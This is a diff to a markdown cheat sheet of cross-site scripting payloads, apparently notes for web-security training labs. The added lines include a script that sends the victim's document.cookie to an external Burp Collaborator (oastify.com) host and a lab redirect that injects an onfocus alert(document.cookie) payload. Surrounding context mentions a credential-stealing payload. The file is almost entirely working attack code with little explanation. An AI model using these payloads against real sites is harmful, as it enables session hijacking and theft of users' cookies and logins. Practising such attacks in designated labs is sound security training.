@@ -92,6 +92,12 @@ body:document.cookie
 });
 </script>
 ```
+```js
+<script>document.location='https://r91uwnam29s3c1jdsyc8t7t34ualyfm4.oastify.com//'+document.cookie</script> 
+```
+```js
+<script>location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=<xss id=x onfocus=alert(document.cookie) tabindex=1>#x';</script>
+```
 ## Payload for stealing credentials
 ```js
 <input name=username id=username>
@@ -201,7 +207,3 @@ Now, use this keys to get reflection.
     On Windows: ALT+SHIFT+X
     On MacOS: CTRL+ALT+X
     On Linux: Alt+X
-#### For cookie grabbing
-```js
-<script>document.location='https://r91uwnam29s3c1jdsyc8t7t34ualyfm4.oastify.com//'+document.cookie</script> 
-```
